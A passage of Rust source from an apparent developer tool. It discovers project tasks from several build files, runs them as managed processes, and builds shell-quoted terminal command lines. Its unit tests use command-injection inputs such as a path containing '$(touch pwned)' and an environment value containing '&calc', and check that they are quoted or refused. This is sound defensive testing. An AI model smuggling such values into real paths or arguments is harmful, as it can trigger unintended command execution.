        }
        if line.starts_with([' ', '\t']) || trimmed.starts_with('[') {
            continue;
        }
        let head_word = trimmed.split_whitespace().next().unwrap_or("");
        if matches!(head_word, "set" | "alias" | "export" | "import" | "mod") {
            pending_doc = None;
            continue;
        }
        let Some((lhs, rhs)) = trimmed.split_once(':') else {
            pending_doc = None;
            continue;
        };
        if rhs.starts_with('=') || lhs.contains(":=") || head_word.contains('=') {
            pending_doc = None;
            continue;
        }
        let raw_name = lhs.split_whitespace().next().unwrap_or("").trim_start_matches('@');
        if raw_name.is_empty()
            || raw_name.starts_with('_')
            || !raw_name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
            || !seen.insert(raw_name.to_string())
        {
            pending_doc = None;
            continue;
        }
        out.push(DiscoveredTask {
            id: format!("justfile:{raw_name}"),
            name: raw_name.to_string(),
            command: format!("just {raw_name}"),
            description: pending_doc.take(),
            cwd: None,
            source: "justfile".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        });
        if out.len() >= 64 {
            break;
        }
    }
    out
}

/// Scans `target_folder` (with `workspace_folder` fallback for `.mighty.local.yaml` and lockfiles) for all project tasks.
pub fn scan_folder_tasks(target_folder: &Path, workspace_folder: &Path) -> (Result<Option<LoadedRepoConfig>, String>, Vec<DiscoveredTask>) {
    let config_res = mighty_yaml::load_from_folder_with_local_fallback(target_folder, workspace_folder);
    let mut tasks = Vec::new();
    if let Ok(Some(loaded)) = &config_res {
        for (name, spec) in &loaded.config.run {
            tasks.push(DiscoveredTask {
                id: format!("run:{name}"),
                name: name.clone(),
                command: spec.command.clone(),
                description: None,
                cwd: None,
                source: "run".into(),
                requires_trust: true,
                concurrent: Some(spec.concurrent),
                url: Some(spec.url.clone()),
            });
        }
        for (name, spec) in &loaded.config.tasks {
            tasks.push(DiscoveredTask {
                id: format!("mighty:{name}"),
                name: name.clone(),
                command: spec.command.clone(),
                description: spec.description.clone(),
                cwd: spec.cwd.clone(),
                source: "mighty".into(),
                requires_trust: true,
                concurrent: None,
                url: None,
            });
        }
    }
    tasks.extend(scan_package_json(target_folder, workspace_folder));
    tasks.extend(scan_cargo_toml(target_folder));
    tasks.extend(scan_makefile(target_folder));
    tasks.extend(scan_justfile(target_folder));
    (config_res, tasks)
}

// ── Target resolution & managed process execution ───────────────────────────────────────────────────────────────────────

struct ResolvedTarget {
    workspace: Workspace,
    pane_id: Option<String>,
    pane_worktree: Option<mighty_core::model::PaneWorktree>,
    target_folder: PathBuf,
    workspace_folder: PathBuf,
}

fn resolve_target(host: &Host, workspace_id: Option<&str>, pane_id: Option<&str>) -> Option<ResolvedTarget> {
    let view = host.view();
    let requested_pane = pane_id
        .filter(|id| !id.is_empty())
        .and_then(|id| view.snapshot.session(id).cloned())
        .or_else(|| view.snapshot.active_session_id.as_deref().and_then(|id| view.snapshot.session(id).cloned()));

    let workspace = workspace_id
        .filter(|id| !id.is_empty())
        .and_then(|id| view.snapshot.workspace(id).cloned())
        .or_else(|| requested_pane.as_ref().and_then(|p| view.snapshot.workspace(p.workspace_id()).cloned()))
        .or_else(|| view.snapshot.active_workspace_id.as_deref().and_then(|id| view.snapshot.workspace(id).cloned()))?;

    if workspace.remote.is_some() || workspace.path().is_empty() {
        return None;
    }

    let pane_for_ws = requested_pane.filter(|p| p.workspace_id() == workspace.id());
    let workspace_folder = PathBuf::from(workspace.path());
    let pane_wt = pane_for_ws.as_ref().and_then(|p| p.pane_worktree.clone());
    let target_folder =
        pane_wt.as_ref().map(|wt| PathBuf::from(wt.run_folder())).filter(|dir| dir.is_dir()).unwrap_or_else(|| workspace_folder.clone());

    Some(ResolvedTarget {
        workspace,
        pane_id: pane_for_ws.map(|p| p.id().to_string()),
        pane_worktree: pane_wt,
        target_folder,
        workspace_folder,
    })
}

fn config_json(config_res: &Result<Option<LoadedRepoConfig>, String>, workspace_path: &str, host: &Host) -> Value {
    match config_res {
        Ok(None) => Value::Null,
        Ok(Some(loaded)) => {
            let approved = is_config_approved(host, workspace_path, &loaded.content_hash);
            let share_paths = loaded.config.worktree.share.clone();
            let copy_rules: Vec<String> = loaded.config.worktree.copy.iter().map(mighty_yaml::CopyRule::display_label).collect();
            let env_keys: Vec<String> = loaded.config.worktree.env.keys().cloned().collect();
            let env_lines = describe_env(&loaded.config.worktree.env);
            json!({
                "present": true,
                "contentHash": loaded.content_hash,
                "shortHash": loaded.short_hash(),
                "approved": approved,
                "shareCount": share_paths.len(),
                "copyCount": copy_rules.len(),
                "sharePaths": share_paths,
                "copyRules": copy_rules,
                "setupCommand": loaded.config.worktree.setup,
                "teardownCommand": loaded.config.worktree.teardown,
                "ports": loaded.config.worktree.port_count(),
                "envKeys": env_keys,
                "envLines": env_lines,
                "files": loaded.files,
                "error": Value::Null,
            })
        }
        Err(error) => json!({
            "present": true,
            "contentHash": "",
            "shortHash": "",
            "approved": false,
            "shareCount": 0,
            "copyCount": 0,
            "sharePaths": [],
            "copyRules": [],
            "setupCommand": Value::Null,
            "envKeys": [],
            "envLines": [],
            "files": [".mighty.yaml"],
            "error": error,
        }),
    }
}

/// Where a task or run action works (`MC-25`): its repository and folder (as `ports.json` keys them), the port block of that worktree,
/// and the variables the main checkout's runs get (a worktree pane's come from its record).
struct RunPlace {
    repo: String,
    folder: String,
    block: Option<PortBlock>,
    variables: Vec<(String, String)>,
}

fn run_place(host: &Host, resolved: &ResolvedTarget, config: Option<&LoadedRepoConfig>) -> RunPlace {
    let folder = crate::worktree_lifecycle::path_key(&resolved.target_folder.to_string_lossy());
    match &resolved.pane_worktree {
        Some(worktree) => RunPlace {
            repo: crate::worktree_lifecycle::path_key(worktree.checkout()),
            folder,
            block: crate::worktree_lifecycle::block_of(worktree),
            variables: Vec::new(),
        },
        None => {
            let count = crate::worktree_lifecycle::port_count(config);
            let (repo, block, variables) = crate::worktree_lifecycle::main_place(host, &resolved.workspace_folder, count);
            RunPlace { repo, folder, block, variables }
        }
    }
}

/// Before a run action starts (`MC-25`): refused while the same action runs in this folder; with `concurrent: false`, the same action
/// running in the repository's other worktrees is stopped first.
async fn make_room_for_action(host: &Host, action: &str, concurrent: bool, place: &RunPlace) -> Result<(), String> {
    let running: Vec<(String, String, String, String)> = {
        let st = state(host);
        let runs = lock(&st.runs);
        runs.values()
            .filter_map(|handle| {
                let inner = lock(&handle.inner);
                let name = inner.action.clone()?;
                (inner.status == "running").then(|| (handle.run_id.clone(), name, inner.repo.clone(), inner.folder.clone()))
            })
            .collect()
    };
    if running.iter().any(|(_, name, repo, folder)| name == action && *repo == place.repo && *folder == place.folder) {
        return Err(format!("The run action '{action}' is already running here."));
    }
    let views: Vec<RunningAction<'_>> =
        running.iter().map(|(_, name, repo, folder)| RunningAction { action: name, repo, folder }).collect();
    for index in run_actions::runs_to_stop(&views, action, &place.repo, &place.folder, concurrent) {
        let _ = stop_managed_task(host, &running[index].0).await;
    }
    Ok(())
}

fn runs_for_workspace(host: &Host, workspace_id: &str, pane_id: Option<&str>) -> Vec<TaskRunSnapshot> {
    let st = state(host);
    let handles: Vec<Arc<ManagedRunHandle>> = {
        let guard = lock(&st.runs);
        guard.values().rev().cloned().collect()
    };
    let mut list: Vec<TaskRunSnapshot> =
        handles.into_iter().map(|h| h.snapshot()).filter(|snap| snap.workspace_id == workspace_id).collect();

    let setup_failure = pane_id.and_then(|pid| {
        let guard = lock(&st.setup_failures);
        guard.get(pid).cloned()
    });
    if let Some(failure) = setup_failure
        && !list.iter().any(|r| r.run_id == failure.run_id)
    {
        list.push(failure);
    }
    list
}

fn resolve_task_cwd(target_folder: &Path, rel_cwd: Option<&str>) -> Result<PathBuf, String> {
    let Some(rel) = rel_cwd.map(str::trim).filter(|s| !s.is_empty() && *s != ".") else {
        return Ok(target_folder.to_path_buf());
    };
    let paths = delegation_paths();
    let root = paths.canonical(&target_folder.to_string_lossy());
    let joined = target_folder.join(rel);
    let meta = std::fs::symlink_metadata(&joined).map_err(|_| format!("Task working directory '{rel}' does not exist."))?;
    if meta.file_type().is_symlink() || is_reparse_point(&meta) || !meta.is_dir() {
        return Err(format!("Task working directory '{rel}' must be a real directory."));
    }
    let canonical = paths.canonical(&joined.to_string_lossy());
    if !same(&canonical, &root) && !is_inside(&canonical, &root) {
        return Err(format!("Task working directory '{rel}' leaves the workspace root."));
    }
    Ok(joined)
}

/// `text` as one POSIX shell word: single-quoted, so `$(...)`, backticks and `$VAR` in a path or a value stay text.
fn posix_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "'\\''"))
}

/// The line typed into a new terminal pane for a task: always `cd` to the folder it runs in (the new pane starts in the active
/// workspace's folder, which a worktree pane's is not), then the environment the managed run gets, then the command. POSIX words are
/// single-quoted; `cmd` gets `cd /d` and `set "K=V"`, and refuses what `cmd` would expand (`%`, `"`, `!`, line breaks).
/// The shell a terminal pane runs, for the line typed into it: a POSIX shell (macOS, Linux), Windows PowerShell (the Windows
/// default) or cmd.exe (Windows without PowerShell).
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum TerminalShell {
    Posix,
    PowerShell,
    Cmd,
}

impl TerminalShell {
    /// The shell `path` names (a terminal pane's default shell).
    pub fn of(path: &Path, windows: bool) -> TerminalShell {
        if !windows {
            return TerminalShell::Posix;
        }
        // The last part of the path, `\` or `/` between folders, without its extension.
        let text = path.to_string_lossy().to_ascii_lowercase();
        let name = text.rsplit(['\\', '/']).next().unwrap_or("");
        let stem = name.strip_suffix(".exe").unwrap_or(name);
        if stem == "powershell" || stem == "pwsh" { TerminalShell::PowerShell } else { TerminalShell::Cmd }
    }
}

/// PowerShell's single-quoted literal: nothing in it expands; a `'` is written twice.
fn powershell_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "''"))
}

fn terminal_command_line(folder: &Path, env: &[(String, String)], command: &str, shell: TerminalShell) -> Result<String, String> {
    let folder = folder.to_string_lossy();
    if folder.contains('\n') || folder.contains('\r') {
        return Err("The task's folder has a line break in its name.".into());
    }
    match shell {
        TerminalShell::Cmd => {
            let plain = |text: &str| !text.contains(['%', '"', '!', '\n', '\r']);
            if !plain(&folder) || env.iter().any(|(k, v)| !plain(k) || !plain(v)) {
                return Err(
                    "The task's folder or environment holds a character cmd.exe would expand (% ! \"); run it from the task panel instead."
                        .into(),
                );
            }
            let mut line = format!("cd /d \"{folder}\"");
            for (key, value) in env {
                line.push_str(&format!(" && set \"{key}={value}\""));
            }
            line.push_str(&format!(" && {}", mighty_yaml::flatten_script(command)));
            Ok(line)
        }
        // Windows PowerShell 5.1 has no `&&`: the folder and environment are set in its own syntax (single-quoted, so nothing
        // expands), and the task's command, written for cmd like the task panel runs it, goes to cmd.exe (`/s` takes the outer
        // quotes PowerShell adds back off).
        TerminalShell::PowerShell => {
            if env.iter().any(|(_, v)| v.contains(['\n', '\r'])) {
                return Err("A task variable has a line break in its value.".into());
            }
            let mut line = format!("Set-Location -LiteralPath {}", powershell_quote(&folder));
            for (key, value) in env {
                line.push_str(&format!("; $env:{key} = {}", powershell_quote(value)));
            }
            line.push_str(&format!("; & cmd.exe /d /s /c {}", powershell_quote(&mighty_yaml::flatten_script(command))));
            Ok(line)
        }
        TerminalShell::Posix => {
            let mut line = format!("cd {}", posix_quote(&folder));
            for (key, value) in env {
                line.push_str(&format!(" && export {key}={}", posix_quote(value)));
            }
            line.push_str(&format!(" && {}", mighty_yaml::flatten_script(command)));
            Ok(line)
        }
    }
}

/// Whether a task is a server or watcher that runs until it is stopped (`dev`, `serve`, `watch`, …) and so is not ended at the
/// 30-minute limit that stops a build or test that hung.
fn runs_until_stopped(name: &str) -> bool {
    const WORDS: [&str; 9] = ["dev", "serve", "server", "start", "watch", "preview", "storybook", "run", "up"];
    name.to_ascii_lowercase().split([':', '-', '_', '.', '/', ' ']).any(|word| WORDS.contains(&word))
}

async fn start_managed_task(
    host: &Arc<Host>,
    resolved: &ResolvedTarget,
    task: DiscoveredTask,
    approved_config: Option<&LoadedRepoConfig>,
    place: RunPlace,
) -> Result<TaskRunSnapshot, String> {
    let run_cwd = resolve_task_cwd(&resolved.target_folder, task.cwd.as_deref())?;
    if host.smoke.is_some() && !crate::delegation::may_touch(host, &run_cwd) {
        return Err(crate::setup::verification_mode());
    }

    let shell_env = login_shell_env(host, Some(&resolved.workspace_folder)).await;
    let (shell, args) = shell_invocation(&task.command);
    let mut request = SpawnRequest::new(shell, args, &run_cwd);
    for (k, v) in shell_env {
        request = request.env(k, v);
    }
    if let Some(cfg) = approved_config {
        for (k, v) in &cfg.config.worktree.env {
            request = request.env(k.clone(), v.clone());
        }
    }
    for (k, v) in &place.variables {
        request = request.env(k.clone(), v.clone());
    }
    if let Some(wt) = &resolved.pane_worktree {
        for (k, v) in wt.environment(resolved.workspace.path()) {
            request = request.env(k, v);
        }
    }

    let mut child = host.processes.spawn(request).await.map_err(|err| err.to_string())?;
    let control = child.control();
    drop(child.stdin.take());
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    let task_name = task.name.clone();
    let is_action = task.source == "run";
    let url_mode = if is_action { task.url.clone() } else { None };
    let (fixed_url, fixed_port) = match url_mode.as_deref() {
        Some("auto" | "off") | None => (None, None),
        Some(fixed) => (Some(fixed.to_string()), run_actions::url_port(fixed)),
    };
    let run_id = wire::new_id();
    let started_at = time::now_o();
    let handle = Arc::new(ManagedRunHandle {
        run_id: run_id.clone(),
        stopped_by_user: AtomicBool::new(false),
        inner: Mutex::new(ManagedRunInner {
            task_id: task.id,
            name: task.name,
            command: task.command,
            source: task.source,
            workspace_id: resolved.workspace.id().to_string(),
            pane_id: resolved.pane_id.clone(),
            status: "running".into(),
            exit_code: None,
            ring: OutputRing::default(),
            started_at,
            ended_at: None,
            control: Some(control.clone()),
            repo: place.repo,
            folder: place.folder,
            action: is_action.then(|| task_name.clone()),
            concurrent: task.concurrent.filter(|_| is_action),
            url_mode,
            url: fixed_url,
            url_port: fixed_port,
            block: place.block,
        }),
    });

    keep_run(host, handle.clone());

    let initial_snapshot = handle.snapshot();
    let runner_handle = handle;
    // A run action is a server or a suite that runs until it ends or is stopped: never cut off at the limit.
    let unlimited = is_action || runs_until_stopped(&task_name);
    tauri::async_runtime::spawn(async move {
        let pump_stream = |mut reader: Option<mighty_platform::process::ChildReader>, target: Arc<ManagedRunHandle>| async move {
            use tokio::io::AsyncReadExt as _;
            let Some(mut pipe) = reader.take() else { return };
            let mut buffer = [0u8; 4096];
            while let Ok(read) = pipe.read(&mut buffer).await {
                if read == 0 {
                    break;
                }
                let mut inner = lock(&target.inner);
                inner.ring.push_bytes(&buffer[..read]);
                inner.detect_url();
            }
        };

        let mut out_pump = tauri::async_runtime::spawn(pump_stream(stdout, runner_handle.clone()));
        let mut err_pump = tauri::async_runtime::spawn(pump_stream(stderr, runner_handle.clone()));
        // The run ends with the task's own process: a grandchild that holds the pipes open (a dev server the task left running)
        // must not keep it "running", so the pipes get a moment to drain once the process is gone and are dropped after it.
        let outcome = if unlimited { Ok(control.wait().await) } else { tokio::time::timeout(MANAGED_TASK_TIMEOUT, control.wait()).await };
        let exit_code = match outcome {
            Ok(Ok(code)) => code,
            Ok(Err(_)) => -1,
            Err(_) => {
                control.kill();
                -1
            }
        };
        if tokio::time::timeout(PIPE_DRAIN_GRACE, async {
            let _ = (&mut out_pump).await;
            let _ = (&mut err_pump).await;
        })
        .await
        .is_err()
        {
            out_pump.abort();
            err_pump.abort();
        }
        let _ = control.close().await;

        let stopped = runner_handle.stopped_by_user.load(Ordering::Acquire);
        let mut inner = lock(&runner_handle.inner);
        inner.control = None;
        if inner.ended_at.is_none() {
            inner.ended_at = Some(time::now_o());
        }
        inner.exit_code = Some(exit_code);
        inner.status = if stopped {
            "stopped".into()
        } else if exit_code == 0 {
            "succeeded".into()
        } else {
            "failed".into()
        };
    });

    Ok(initial_snapshot)
}

async fn stop_managed_task(host: &Host, run_id: &str) -> Result<Option<TaskRunSnapshot>, String> {
    let handle = {
        let st = state(host);
        let guard = lock(&st.runs);
        guard.get(run_id).cloned()
    };
    let Some(handle) = handle else {
        return Ok(None);
    };
    handle.stopped_by_user.store(true, Ordering::Release);
    let control = {
        let mut inner = lock(&handle.inner);
        if inner.status == "running" {
            inner.status = "stopped".into();
            inner.ended_at = Some(time::now_o());
        }
        inner.control.take()
    };
    if let Some(control) = control {
        control.kill();
        let _ = control.close().await;
    }
    Ok(Some(handle.snapshot()))
}

// ── IPC registration ────────────────────────────────────────────────────────────────────────────────────────────────────

pub fn register(methods: &mut Registry) {
    methods.add("repoTasksList", |host: Arc<Host>, args| async move {
        let ws_id = text(&args, "workspaceId").map(str::to_string);
        let pane_id = text(&args, "paneId").map(str::to_string);
        let Some(resolved) = resolve_target(&host, ws_id.as_deref(), pane_id.as_deref()) else {
            return Ok(json!({ "config": Value::Null, "tasks": [], "runs": [] }));
        };
        let target_dir = resolved.target_folder.clone();
        let ws_dir = resolved.workspace_folder.clone();
        let (config_res, tasks) =
            tauri::async_runtime::spawn_blocking(move || scan_folder_tasks(&target_dir, &ws_dir)).await.map_err(|err| err.to_string())?;
        let cfg_value = config_json(&config_res, resolved.workspace.path(), &host);
        let loaded = config_res.as_ref().ok().and_then(Option::as_ref);
        let place = run_place(&host, &resolved, loaded);
        let mut runs = runs_for_workspace(&host, resolved.workspace.id(), resolved.pane_id.as_deref());
        let ports: Vec<u16> = runs.iter().filter(|r| r.status == "running").filter_map(|r| r.url_port).collect();
        if !ports.is_empty() && host.smoke.is_none() {
            let listening: HashMap<u16, bool> = tauri::async_runtime::spawn_blocking(move || {
                ports.into_iter().map(|port| (port, worktree_ports::port_in_use(port))).collect()
            })
            .await
            .unwrap_or_default();
            for run in runs.iter_mut().filter(|r| r.status == "running") {
                run.url_listening = run.url_port.and_then(|port| listening.get(&port).copied());
            }
        }
        let port_block = place.block.map(|b| json!({ "base": b.base, "count": b.count, "label": b.label() }));
        Ok(json!({
            "workspaceId": resolved.workspace.id(),
            "paneId": resolved.pane_id,
            "folder": resolved.target_folder.to_string_lossy(),
            "config": cfg_value,
            "tasks": tasks,
            "runs": runs,
            "portBlock": port_block,
        }))
    });

    methods.add("repoConfigApprove", |host: Arc<Host>, args| async move {
        let ws_id = text(&args, "workspaceId").map(str::to_string);
        let Some(content_hash) = text(&args, "contentHash").map(str::to_string) else {
            return Err("Missing contentHash.".into());
        };
        let pane_id = text(&args, "paneId").map(str::to_string);
        let Some(resolved) = resolve_target(&host, ws_id.as_deref(), pane_id.as_deref()) else {
            return Err("Workspace not found.".into());
        };
        let status = approve_config_in(&host, &resolved.workspace, Some(resolved.target_folder.clone()), &content_hash).await?;
        Ok(json!({
            "approved": status.approved,
            "contentHash": status.loaded.content_hash,
            "shortHash": status.loaded.short_hash(),
        }))
    });

    methods.add("repoConfigRevoke", |host: Arc<Host>, args| async move {
        let ws_id = text(&args, "workspaceId").map(str::to_string);
        let Some(resolved) = resolve_target(&host, ws_id.as_deref(), None) else {
            return Err("Workspace not found.".into());
        };
        revoke_workspace_config(&host, &resolved.workspace).await?;
        Ok(json!({ "approved": false }))
    });

    methods.add("repoTaskRun", |host: Arc<Host>, args| async move {
        let ws_id = text(&args, "workspaceId").map(str::to_string);
        let pane_id = text(&args, "paneId").map(str::to_string);
        let Some(task_id) = text(&args, "taskId").map(str::to_string) else {
            return Err("Missing taskId.".into());
        };
        let in_terminal = flag(&args, "inTerminal");
        let Some(resolved) = resolve_target(&host, ws_id.as_deref(), pane_id.as_deref()) else {
            return Err("Workspace not found.".into());
        };

        let target_dir = resolved.target_folder.clone();
        let ws_dir = resolved.workspace_folder.clone();
        let (config_res, tasks) =
            tauri::async_runtime::spawn_blocking(move || scan_folder_tasks(&target_dir, &ws_dir)).await.map_err(|err| err.to_string())?;

        let task = tasks.into_iter().find(|t| t.id == task_id).ok_or_else(|| format!("Task '{task_id}' was not found."))?;
        let loaded_cfg = config_res.ok().flatten();
        let approved_cfg = loaded_cfg.as_ref().filter(|cfg| is_config_approved(&host, resolved.workspace.path(), &cfg.content_hash));

        if (task.source == "mighty" || task.requires_trust) && approved_cfg.is_none() {
            return Err("Approve .mighty.yaml before running tasks defined in the repository.".into());
        }

        let place = run_place(&host, &resolved, loaded_cfg.as_ref());
        if in_terminal {
            let run_cwd = resolve_task_cwd(&resolved.target_folder, task.cwd.as_deref())?;
            let mut env: Vec<(String, String)> = vec![];
            if let Some(cfg) = approved_cfg {
                env.extend(cfg.config.worktree.env.iter().map(|(k, v)| (k.clone(), v.clone())));
            }
            env.extend(place.variables.iter().cloned());
            if let Some(wt) = &resolved.pane_worktree {
                env.extend(wt.environment(resolved.workspace.path()));
            }
            let shell = TerminalShell::of(&crate::terminal::terminals(&host)?.default_shell(), cfg!(windows));
            let terminal_cmd = terminal_command_line(&run_cwd, &env, &task.command, shell)?;
            crate::styles::run_terminal_command(&host, &terminal_cmd, &task.name, true).await?;
            return Ok(json!({ "inTerminal": true }));
        }

        if task.source == "run" {
            make_room_for_action(&host, &task.name, task.concurrent.unwrap_or(true), &place).await?;
        }
        let snapshot = start_managed_task(&host, &resolved, task, approved_cfg, place).await?;
        Ok(json!({ "run": snapshot }))
    });

    methods.add("repoTaskStop", |host: Arc<Host>, args| async move {
        let Some(run_id) = text(&args, "runId").map(str::to_string) else {
            return Err("Missing runId.".into());
        };
        let stopped = stop_managed_task(&host, &run_id).await?;
        Ok(json!({ "ok": stopped.is_some(), "run": stopped }))
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("mighty-repo-tasks-{tag}-{}", wire::new_id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn trust_store_writes_0600_and_round_trips_only_valid_sha256_hashes() {
        let dir = temp_dir("trust");
        let valid_hash = "a".repeat(64);
        let mut map = HashMap::new();
        map.insert("/workspace/app".into(), valid_hash.clone());
        map.insert("/workspace/bad".into(), "not-a-sha256".into());

        save_trust_map(&dir, &map).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            let mode = std::fs::metadata(dir.join(TRUST_FILE_NAME)).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600, "trust store must be 0600 on Unix");
        }
        let loaded = load_trust_map(&dir);
        assert_eq!(loaded.len(), 1);
        assert_eq!(loaded.get("/workspace/app").map(String::as_str), Some(valid_hash.as_str()));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn scans_mighty_yaml_package_json_lockfiles_cargo_makefile_and_justfile() {
        let dir = temp_dir("scan");
        std::fs::write(dir.join(".mighty.yaml"), "version: 1\ntasks:\n  smoke: pnpm test:smoke\n").unwrap();
        std::fs::write(dir.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n").unwrap();
        std::fs::write(dir.join("package.json"), r#"{"scripts":{"dev":"vite","typecheck":"tsc --noEmit"}}"#).unwrap();
        std::fs::write(
            dir.join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[package.metadata.scripts]\nlint-all = \"cargo clippy --workspace\"\n",
        )
        .unwrap();
        std::fs::write(dir.join("Makefile"), ".PHONY: deploy\ndeploy: build\n\t./deploy.sh\n").unwrap();
        std::fs::write(dir.join("justfile"), "# Run database migrations\nmigrate env='dev':\n  echo {{env}}\n").unwrap();

        let (cfg, tasks) = scan_folder_tasks(&dir, &dir);
        assert!(cfg.unwrap().is_some());

        let by_id: HashMap<String, DiscoveredTask> = tasks.into_iter().map(|t| (t.id.clone(), t)).collect();
        assert_eq!(by_id["mighty:smoke"].command, "pnpm test:smoke");
        assert!(by_id["mighty:smoke"].requires_trust);
        assert_eq!(by_id["package.json:dev"].command, "pnpm run dev");
        assert_eq!(by_id["package.json:typecheck"].command, "pnpm run typecheck");
        assert_eq!(by_id["Cargo.toml:check"].command, "cargo check");
        assert_eq!(by_id["Cargo.toml:lint-all"].command, "cargo clippy --workspace");
        assert_eq!(by_id["Makefile:deploy"].command, "make deploy");
        assert_eq!(by_id["justfile:migrate"].command, "just migrate");
        assert_eq!(by_id["justfile:migrate"].description.as_deref(), Some("Run database migrations"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_terminal_line_quotes_the_folder_and_carries_the_environment() {
        let env = vec![("PORT".to_string(), "4100".to_string()), ("NOTE".to_string(), "it's $(x)".to_string())];
        let line = terminal_command_line(Path::new("/w/$(touch pwned)/a'b"), &env, "npm test\nnpm run lint", TerminalShell::Posix).unwrap();
        assert_eq!(line, "cd '/w/$(touch pwned)/a'\\''b' && export PORT='4100' && export NOTE='it'\\''s $(x)' && npm test && npm run lint");
        let line = terminal_command_line(Path::new(r"C:\work tree"), &env[..1], "npm test", TerminalShell::Cmd).unwrap();
        assert_eq!(line, r#"cd /d "C:\work tree" && set "PORT=4100" && npm test"#);
        assert!(terminal_command_line(Path::new(r"C:\%PATH%"), &[], "x", TerminalShell::Cmd).is_err());
        assert!(terminal_command_line(Path::new("/a"), &[("K".into(), "v\"&calc".into())], "x", TerminalShell::Cmd).is_err());
        // Windows PowerShell, the default terminal there: its own syntax, nothing expanding, the command handed to cmd.exe.
        let line = terminal_command_line(Path::new(r"C:\it's $(x)"), &env, "npm test\nnpm run lint", TerminalShell::PowerShell).unwrap();
        assert_eq!(
            line,
            r#"Set-Location -LiteralPath 'C:\it''s $(x)'; $env:PORT = '4100'; $env:NOTE = 'it''s $(x)'; & cmd.exe /d /s /c 'npm test && npm run lint'"#
        );
        assert_eq!(
            TerminalShell::of(Path::new(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), true),
            TerminalShell::PowerShell
        );
        assert_eq!(TerminalShell::of(Path::new(r"C:\Windows\System32\cmd.exe"), true), TerminalShell::Cmd);
        assert_eq!(TerminalShell::of(Path::new("/bin/zsh"), false), TerminalShell::Posix);
    }

    #[test]
    fn a_terminal_line_carries_the_worktree_variables_the_same_way_in_every_shell() {
        let env = vec![
            ("MIGHTY_PORT".to_string(), "41010".to_string()),
            ("MIGHTY_PORT_COUNT".to_string(), "10".to_string()),
            ("MIGHTY_WORKTREE_PATH".to_string(), r"C:\Users\me\.mightycode\worktrees\p1".to_string()),
        ];
        let command = "npm run dev -- --port $MIGHTY_PORT";
        let posix = terminal_command_line(Path::new("/wt/p1"), &env, command, TerminalShell::Posix).unwrap();
        assert_eq!(
            posix,
            r"cd '/wt/p1' && export MIGHTY_PORT='41010' && export MIGHTY_PORT_COUNT='10' && export MIGHTY_WORKTREE_PATH='C:\Users\me\.mightycode\worktrees\p1' && npm run dev -- --port $MIGHTY_PORT"
        );
        let cmd = terminal_command_line(Path::new(r"C:\wt\p1"), &env, "npm run dev -- --port %MIGHTY_PORT%", TerminalShell::Cmd).unwrap();
        assert_eq!(
            cmd,
            r#"cd /d "C:\wt\p1" && set "MIGHTY_PORT=41010" && set "MIGHTY_PORT_COUNT=10" && set "MIGHTY_WORKTREE_PATH=C:\Users\me\.mightycode\worktrees\p1" && npm run dev -- --port %MIGHTY_PORT%"#
        );
        // PowerShell sets the same variables in its own syntax and hands the command to cmd.exe, as the managed run does.
        let ps =
            terminal_command_line(Path::new(r"C:\wt\p1"), &env, "npm run dev -- --port %MIGHTY_PORT%", TerminalShell::PowerShell).unwrap();
        assert_eq!(
            ps,
            r"Set-Location -LiteralPath 'C:\wt\p1'; $env:MIGHTY_PORT = '41010'; $env:MIGHTY_PORT_COUNT = '10'; $env:MIGHTY_WORKTREE_PATH = 'C:\Users\me\.mightycode\worktrees\p1'; & cmd.exe /d /s /c 'npm run dev -- --port %MIGHTY_PORT%'"
        );
        // A teardown of several lines runs as one line in cmd, joined like `&&` would on POSIX (`sh -ec`).
        assert_eq!(
            shell_invocation("docker compose down\nrm -rf tmp").1.last().map(String::as_str),
            Some(if cfg!(windows) { "docker compose down && rm -rf tmp" } else { "docker compose down\nrm -rf tmp" })
        );
    }

    #[test]
    fn run_actions_are_listed_first_and_need_trust() {
        let dir = temp_dir("run-actions");
        std::fs::write(
            dir.join(".mighty.yaml"),
            "version: 1\nrun:\n  dev: npm run dev\n  e2e:\n    command: npm run e2e\n    concurrent: false\n    url: off\ntasks:\n  lint: npm run lint\n",
        )
        .unwrap();
        let (_, tasks) = scan_folder_tasks(&dir, &dir);
        assert_eq!(tasks[0].id, "run:dev");
        assert_eq!((tasks[0].source.as_str(), tasks[0].requires_trust, tasks[0].concurrent), ("run", true, Some(true)));
        assert_eq!(tasks[0].url.as_deref(), Some("auto"));
        assert_eq!((tasks[1].id.as_str(), tasks[1].concurrent, tasks[1].url.as_deref()), ("run:e2e", Some(false), Some("off")));
        assert_eq!((tasks[2].id.as_str(), tasks[2].concurrent), ("mighty:lint", None));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_run_finds_its_address_once_and_flags_a_port_outside_its_block() {
        let mut inner = ManagedRunInner::finished("run:dev", "dev", "npm run dev", "w", None);
        inner.status = "running".into();
        inner.url_mode = Some("auto".into());
        inner.block = Some(PortBlock { base: 41_010, count: 10 });
        inner.ring.push_text("\x1b[32m  ➜  Local:   http://localhost:5173/\x1b[0m\n");
        inner.detect_url();
        inner.ring.push_text("  ➜  Local:   http://localhost:41010/\n");
        inner.detect_url();
        assert_eq!(inner.url.as_deref(), Some("http://localhost:5173/"), "the first address stays");
        let handle = ManagedRunHandle { run_id: "r".into(), stopped_by_user: AtomicBool::new(false), inner: Mutex::new(inner) };
        let snapshot = handle.snapshot();
        assert_eq!(snapshot.url_port, Some(5173));
        assert!(snapshot.url_outside_block, "5173 lies outside 41010-41019");

        let mut off = ManagedRunInner::finished("run:e2e", "e2e", "npm run e2e", "w", None);
        off.url_mode = Some("off".into());
        off.ring.push_text("http://localhost:41011\n");
